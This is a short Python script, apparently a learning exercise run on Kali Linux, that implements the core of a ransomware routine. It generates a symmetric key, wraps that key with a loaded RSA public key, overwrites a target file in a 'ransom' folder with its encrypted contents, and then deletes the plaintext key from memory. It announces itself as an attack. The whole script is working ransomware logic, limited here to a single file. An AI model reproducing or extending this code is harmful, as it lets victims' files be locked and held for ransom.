from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import gc

print("****[+]Starting Attack****")
print("---------------------------")
# Generate a symmetric key for Fernet encryption
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

# Load the public key from a file
with open("/home/kali/allan_python/cryptography/public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

# Encrypt the symmetric key using the public key
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Save the encrypted symmetric key to a file
with open("encryptedSymmetricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

# Read the file that needs to be encrypted
filePath = "/home/kali/allan_python/cryptography/ransom/plan.txt"
with open(filePath, "rb") as file:
    file_data = file.read()

# Encrypt the file data using the symmetric key
encrypted_data = FernetInstance.encrypt(file_data)

# Write the encrypted data back to the file
with open(filePath, "wb") as file:
    file.write(encrypted_data)

# Explicitly delete the symmetric key from memory
del symmetricKey
del FernetInstance
gc.collect()  # Invoke the garbage collector to ensure the key is removed from memory

print("[+]Encryption was successful")
# Quit the program
quit()
